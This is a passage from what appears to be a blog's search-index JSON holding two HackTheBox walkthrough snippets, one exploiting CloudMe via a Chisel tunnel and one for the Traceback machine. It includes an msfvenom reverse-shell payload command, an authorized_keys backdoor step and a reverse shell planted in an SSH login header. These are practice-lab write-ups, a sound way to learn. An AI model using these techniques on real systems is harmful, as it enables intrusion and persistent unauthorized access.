to run on windows i used golangenv GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags &quot;-s -w&quot; You can compile it by this command After compilt it to exe , let`s upload it ŸêI started the server at 8080 on my machineŸêWe need to start Chisel on the victim machine to connectExploiting Cloudme We need to adjust msfvenom cmd to get a shell to our machine So you to copy this and adjust your Ip address to get your shell&quot;msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 EXITFUNC=thread -b &quot;\\x00\\x0d\\x0a&quot; -f python&quot; ExploitRun your listner on the port you choosed in the payload then run the EXPLOIT ..ROOT Flag !Thanks for Reading üôè" }, { "title": "Hackthebox Tracback walkthrough", "url": "/posts/HackTheBox-Traceback-Walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-25 22:24:00 +0000", "snippet": "EnumerationŸêWe will use NMAP for enumeration phase, So let`s GO !. ŸêSo NMAP found that port 22 and port 80 are open.Let`s Check port 80. ŸêOuch! look like someone was here before us.ŸêLet`s view the source code. ŸêHe left a backdoor for us.Now search for Xh4h web shell Now let`s clone it and try them. So it`s smevk.php webshell.let`s open the shell and see what is in it. Foothold We found the password.let`s login.We are logged as WebAdmin.let`s discover what we can do. So i found that i can log in as webadmin by SSH.let`s upload our public key. Execute this to use your public key.echo ‚Äúyour-publickey‚Äù &amp;gt;&amp;gt; authorized_keys in Execute option in /home/webadmin/.ssh/ directory Let`s log in now !. Privilege Escalation We need to see what i can do without sudo password. We can switch to sysadmin User hash Let`s run Pspy to see runing proccess. Gotcha !. 00-header displays when we log by ssh as webadmin so we need to make our reverse shell. I used Pentestmonkey cheatsheet Start you nc and log as webadmin and you will get root access. Thanks for Reading üôè" } ]
